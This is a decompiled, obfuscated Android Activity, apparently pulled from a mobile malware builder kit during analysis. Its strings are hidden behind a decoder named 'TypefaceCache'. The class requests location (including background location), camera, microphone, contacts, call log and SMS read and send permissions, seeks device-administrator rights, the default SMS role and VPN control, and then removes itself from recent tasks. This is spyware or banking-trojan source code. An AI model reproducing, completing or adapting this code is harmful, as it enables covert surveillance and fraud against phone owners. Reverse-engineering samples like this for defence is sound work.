package app.mobilex.plus;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.app.role.RoleManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import app.mobilex.plus.receivers.DeviceAdminReceiver;
import app.mobilex.plus.util.TypefaceCache;
import java.util.ArrayList;
import java.util.Collections;
import v.s.Aqh0grSwgDbwr;
import v.s.D8f4u3NB1PCAS427;
import v.s.GUsyOYEIobMSb6n;
import v.s.JW3Lh9hxwLsO2ArTlH;
import v.s.qkzRt1s9DJNNYwsqt;
import v.s.yI1KTRoNlsjx;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class ManagerQJWorker extends Activity {
    public static final String Ee8d2j4S9Vm5yGuR;
    public static final String JXn4Qf7zpnLjP5;
    public static final String b1EoSIRjJHO5;
    public static final String dDIMxZXP1V8HdM;
    public static final String ibVTtJUNfrGYbW;
    public static final String vekpFI4d1Nc4fakF;
    public static final String w9sT1Swbhx3hs;
    public static final String xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("001300730049008A00D100BC00C600AE0035007F004F009E");
        dDIMxZXP1V8HdM = TypefaceCache.obtain("00310073004A009200F500AC00C60098002F00790058008600E400B600DD00A9");
        w9sT1Swbhx3hs = TypefaceCache.obtain("00310073004A009200F500AC00C60098002200720056008E00FE");
        vekpFI4d1Nc4fakF = TypefaceCache.obtain("00310073004A009200F500AC00C600980022007A005700B800E200AA00DC00B3002A007B005E");
        JXn4Qf7zpnLjP5 = TypefaceCache.obtain("00310073004A009200F500AC00C60098002D0079004F008E00F600B600D100A60037007F0054008900E3");
        Ee8d2j4S9Vm5yGuR = TypefaceCache.obtain("00310073004A009200F500AC00C60098002400640054009200E0");
        xDyLpEZyrcKVe0 = TypefaceCache.obtain("00310073004A009200F500AC00C6009800270073005D008600E500B300C600980030007B0048");
        ibVTtJUNfrGYbW = TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C00780064008600F300AB00DB00A8002D");
        b1EoSIRjJHO5 = TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C00780064008B00F900AC00C6");
    }

    @Override // android.app.Activity
    public final void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        TypefaceCache.obtain("002C0078007A008400E400B600C400AE0037006F0069008200E300AA00DE00B3007900360049008200E100AA00D700B4003700550054008300F500E2");
        TypefaceCache.obtain("006F00360049008200E300AA00DE00B300000079005F008200AD");
        finishAndRemoveTask();
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        String stringExtra = getIntent().getStringExtra(ibVTtJUNfrGYbW);
        if (stringExtra == null) {
            stringExtra = "";
        }
        TypefaceCache.obtain("002C00780078009500F500BE00C600A2006300770058009300F900B000DC00FA");
        if (stringExtra.equals(vekpFI4d1Nc4fakF)) {
            ArrayList arrayList = new ArrayList();
            if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != 0) {
                arrayList.add("android.permission.ACCESS_FINE_LOCATION");
                arrayList.add("android.permission.ACCESS_COARSE_LOCATION");
            }
            if (checkSelfPermission("android.permission.CAMERA") != 0) {
                arrayList.add("android.permission.CAMERA");
            }
            if (checkSelfPermission("android.permission.RECORD_AUDIO") != 0) {
                arrayList.add("android.permission.RECORD_AUDIO");
            }
            if (checkSelfPermission("android.permission.READ_CONTACTS") != 0) {
                arrayList.add("android.permission.READ_CONTACTS");
            }
            if (checkSelfPermission("android.permission.READ_PHONE_STATE") != 0) {
                arrayList.add("android.permission.READ_PHONE_STATE");
            }
            if (checkSelfPermission("android.permission.READ_CALL_LOG") != 0) {
                arrayList.add("android.permission.READ_CALL_LOG");
            }
            if (checkSelfPermission("android.permission.CALL_PHONE") != 0) {
                arrayList.add("android.permission.CALL_PHONE");
            }
            if (checkSelfPermission("android.permission.READ_SMS") != 0) {
                arrayList.add("android.permission.READ_SMS");
            }
            if (checkSelfPermission("android.permission.SEND_SMS") != 0) {
                arrayList.add("android.permission.SEND_SMS");
            }
            if (checkSelfPermission("android.permission.RECEIVE_SMS") != 0) {
                arrayList.add("android.permission.RECEIVE_SMS");
            }
            if (Build.VERSION.SDK_INT >= 33) {
                if (checkSelfPermission("android.permission.READ_MEDIA_IMAGES") != 0) {
                    arrayList.add("android.permission.READ_MEDIA_IMAGES");
                }
                if (checkSelfPermission("android.permission.READ_MEDIA_VIDEO") != 0) {
                    arrayList.add("android.permission.READ_MEDIA_VIDEO");
                }
                if (checkSelfPermission("android.permission.READ_MEDIA_AUDIO") != 0) {
                    arrayList.add("android.permission.READ_MEDIA_AUDIO");
                }
                if (checkSelfPermission("android.permission.NEARBY_WIFI_DEVICES") != 0) {
                    arrayList.add("android.permission.NEARBY_WIFI_DEVICES");
                }
                if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") != 0) {
                    arrayList.add("android.permission.POST_NOTIFICATIONS");
                }
            }
            TypefaceCache.obtain("00310073004A009200F500AC00C60086002F007A0069009200FE00AB00DB00AA0026002C001B");
            arrayList.size();
            TypefaceCache.obtain("00630066005E009500FD00B600C100B4002A00790055009400B000B100D700A200270073005F00DD00B0");
            arrayList.toString();
            if (!arrayList.isEmpty()) {
                requestPermissions((String[]) arrayList.toArray(new String[0]), 100);
                return;
            } else {
                TypefaceCache.obtain("0002007A005700C700E200AA00DC00B3002A007B005E00C700E000BA00C000AA002A00650048008E00FF00B100C100E70022007A0049008200F100BB00CB00E700240064005A008900E400BA00D6");
                finish();
                return;
            }
        }
        if (stringExtra.equals(JXn4Qf7zpnLjP5)) {
            if (Build.VERSION.SDK_INT < 33 || checkSelfPermission("android.permission.POST_NOTIFICATIONS") == 0) {
                TypefaceCache.obtain("000D0079004F008E00F600B600D100A60037007F0054008900B000AF00D700B5002E007F0048009400F900B000DC00E70022007A0049008200F100BB00CB00E700240064005A008900E400BA00D600E7002C0064001B008900FF00AB009200A900260073005F008200F4");
                finish();
                return;
            } else {
                TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B00B700DF008C00E60098000D0059006F00AE00D6009600F100860017005F007400A900C3");
                requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"}, 100);
                return;
            }
        }
        if (stringExtra.equals(dDIMxZXP1V8HdM)) {
            ArrayList arrayListVIJudZvPyTuNp = Aqh0grSwgDbwr.vIJudZvPyTuNp("android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION");
            int i = Build.VERSION.SDK_INT;
            if (i >= 29) {
                arrayListVIJudZvPyTuNp.add("android.permission.ACCESS_BACKGROUND_LOCATION");
            }
            if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != 0) {
                TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B008B00FF00BC00D300B3002A0079005500C700E000BA00C000AA002A00650048008E00FF00B100C1");
                requestPermissions((String[]) arrayListVIJudZvPyTuNp.toArray(new String[0]), 100);
                return;
            } else if (i < 29 || checkSelfPermission("android.permission.ACCESS_BACKGROUND_LOCATION") == 0) {
                TypefaceCache.obtain("000F00790058008600E400B600DD00A9006300770057009500F500BE00D600BE006300710049008600FE00AB00D700A3");
                finish();
                return;
            } else {
                TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B008500F100BC00D900A000310079004E008900F400FF00DE00A800200077004F008E00FF00B1");
                requestPermissions(new String[]{"android.permission.ACCESS_BACKGROUND_LOCATION"}, 100);
                return;
            }
        }
        if (stringExtra.equals(w9sT1Swbhx3hs)) {
            ComponentName componentName = new ComponentName(this, (Class<?>) DeviceAdminReceiver.class);
            if (((DevicePolicyManager) getSystemService("device_policy")).isAdminActive(componentName)) {
                TypefaceCache.obtain("00070073004D008E00F300BA009200A60027007B0052008900B000BE00DE00B500260077005F009E00B000BE00D100B3002A0060005E");
                finish();
                return;
            }
            TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B008300F500A900DB00A400260036005A008300FD00B600DC");
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", TypefaceCache.checked("04610456040E04D604D304EA04F00486040C0036040F04DC04DF00FF04F104F804030426040904DC04A504E2048A048800630455047A04A504D004E1048B048604010424040504DB"));
            startActivityForResult(intent, 101);
            return;
        }
        if (stringExtra.equals(Ee8d2j4S9Vm5yGuR)) {
            String[] stringArrayExtra = getIntent().getStringArrayExtra(b1EoSIRjJHO5);
            if (stringArrayExtra == null || stringArrayExtra.length == 0) {
                TypefaceCache.obtain("000D0079001B009700F500AD00DF00AE003000650052008800FE00AC009200AE002D0036005C009500FF00AA00C200E700310073004A009200F500AC00C6");
                finish();
                return;
            }
            ArrayList arrayList2 = new ArrayList();
            for (String str : stringArrayExtra) {
                if (checkSelfPermission(str) != 0) {
                    arrayList2.add(str);
                }
            }
            String[] strArr = (String[]) arrayList2.toArray(new String[0]);
            if (strArr.length == 0) {
                TypefaceCache.obtain("0002007A005700C700E000BA00C000AA002A00650048008E00FF00B100C100E7002A0078001B008000E200B000C700B7006300770057009500F500BE00D600BE006300710049008600FE00AB00D700A3");
                finish();
                return;
            }
            TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B008000E200B000C700B700790036");
            int length = strArr.length;
            (length != 0 ? length != 1 ? new ArrayList(new GUsyOYEIobMSb6n(strArr, false)) : Collections.singletonList(strArr[0]) : qkzRt1s9DJNNYwsqt.w9sT1Swbhx3hs).toString();
            requestPermissions(strArr, 100);
            return;
        }
        if (!stringExtra.equals(xDyLpEZyrcKVe0)) {
            if (!stringExtra.equals(TypefaceCache.obtain("00310073004A009200F500AC00C60098003500660055"))) {
                TypefaceCache.obtain("001600780050008900FF00A800DC00E700220075004F008E00FF00B1008800E7");
                finish();
                return;
            }
            try {
                Intent intentPrepare = VpnService.prepare(this);
                if (intentPrepare != null) {
                    TypefaceCache.obtain("000F0077004E008900F300B700DB00A900240036006D00B700DE00FF00D100A8002D0065005E008900E400FF00D600AE0022007A00540080");
                    startActivityForResult(intentPrepare, 103);
                } else {
                    TypefaceCache.obtain("00150046007500C700F100B300C000A200220072004200C700F300B000DC00B400260078004F008200F4");
                    finishAndRemoveTask();
                }
                return;
            } catch (Exception e) {
                TypefaceCache.obtain("00150046007500C700F300B000DC00B400260078004F00C700F600BE00DB00AB00260072000100C7");
                e.getMessage();
                finishAndRemoveTask();
                return;
            }
        }
        if (Build.VERSION.SDK_INT >= 29) {
            try {
                Object systemService = getSystemService("role");
                RoleManager roleManagerDDIMxZXP1V8HdM = JW3Lh9hxwLsO2ArTlH.EWUjsTERgdPbSw3NNlN(systemService) ? JW3Lh9hxwLsO2ArTlH.dDIMxZXP1V8HdM(systemService) : null;
                if (roleManagerDDIMxZXP1V8HdM != null && roleManagerDDIMxZXP1V8HdM.isRoleAvailable("android.app.role.SMS") && !roleManagerDDIMxZXP1V8HdM.isRoleHeld("android.app.role.SMS")) {
                    TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B00B400DD008C009200B5002C007A005E00C700E600B600D300E7001100790057008200DD00BE00DC00A6002400730049");
                    startActivityForResult(roleManagerDDIMxZXP1V8HdM.createRequestRoleIntent("android.app.role.SMS"), 102);
                    return;
                }
            } catch (Exception e2) {
                TypefaceCache.obtain("001100790057008200DD00BE00DC00A600240073004900C700C3009200E100E7002500770052008B00F500BB008800E7");
                e2.getMessage();
            }
        }
        try {
            Intent intent2 = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
            intent2.putExtra("package", getPackageName());
            TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B00B400DD008C009200A300260070005A009200FC00AB009200B1002A0077001B00A600D3008B00FB0088000D0049007800AF00D1009100F50082001C0052007E00A100D1008A00FE0093");
            startActivityForResult(intent2, 102);
        } catch (Exception e3) {
            TypefaceCache.obtain("00020055006F00AE00DF009100ED0084000B0057007500A000D5008000F6008200050057006E00AB00C400FF00D400A6002A007A005E008300AA00FF");
            e3.getMessage();
            try {
                startActivity(new Intent("android.settings.MANAGE_DEFAULT_APPS_SETTINGS"));
            } catch (Exception unused) {
            }
            finish();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r6v3, types: [v.s.qkzRt1s9DJNNYwsqt] */
    /* JADX WARN: Type inference failed for: r6v4, types: [java.lang.Iterable] */
    /* JADX WARN: Type inference failed for: r6v8, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r6v9, types: [java.util.ArrayList] */
    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        ?? SingletonList;
        super.onRequestPermissionsResult(i, strArr, iArr);
        TypefaceCache.obtain("002C00780069008200E100AA00D700B400370046005E009500FD00B600C100B4002A00790055009400C200BA00C100B2002F0062000100C7");
        int length = iArr.length;
        int i2 = 0;
        if (length == 0) {
            SingletonList = qkzRt1s9DJNNYwsqt.w9sT1Swbhx3hs;
        } else if (length != 1) {
            SingletonList = new ArrayList(iArr.length);
            for (int i3 : iArr) {
                SingletonList.add(Integer.valueOf(i3));
            }
        } else {
            SingletonList = Collections.singletonList(Integer.valueOf(iArr[0]));
        }
        int length2 = strArr.length;
        ArrayList arrayList = new ArrayList(Math.min(D8f4u3NB1PCAS427.xfn2GJwmGqs7kWW(SingletonList), length2));
        for (Object obj : SingletonList) {
            if (i2 >= length2) {
                break;
            }
            arrayList.add(new yI1KTRoNlsjx(strArr[i2], obj));
            i2++;
        }
        arrayList.toString();
        finishAndRemoveTask();
    }
}
